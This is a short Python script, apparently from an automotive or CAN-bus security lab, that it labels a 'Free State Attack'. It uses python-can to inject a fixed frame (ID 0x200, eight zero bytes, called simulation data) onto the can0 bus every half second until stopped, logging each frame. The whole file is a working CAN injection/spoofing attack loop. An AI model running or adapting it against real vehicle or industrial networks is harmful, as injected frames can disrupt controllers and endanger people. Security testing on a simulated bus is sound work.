import can
import time
import logging

CAN_CHANNEL = 'can0'
CAN_BUSTYPE = 'socketcan'

FREE_STATE_ID = 0x200
FREE_STATE_DATA = [0x00] * 8  # Dados fictÃ­cios para simulaÃ§Ã£o

# ConfiguraÃ§Ã£o do log
logging.basicConfig(
    filename="freestate_attack.log",
    level=logging.INFO,
    format="%(asctime)s ID=%(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

def free_state_attack():
    bus = can.interface.Bus(channel=CAN_CHANNEL, bustype=CAN_BUSTYPE)
    print("[ATAQUE] Iniciando Free State Attack... (CTRL+C para parar)")
    try:
        while True:
            msg = can.Message(arbitration_id=FREE_STATE_ID, data=FREE_STATE_DATA, is_extended_id=False)
            bus.send(msg)
            logging.info(f"{hex(msg.arbitration_id)} DATA={' '.join(f'{b:02X}' for b in msg.data)}")
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[INFO] Free State Attack interrompido.")
    finally:
        bus.shutdown()

if __name__ == "__main__":
    free_state_attack()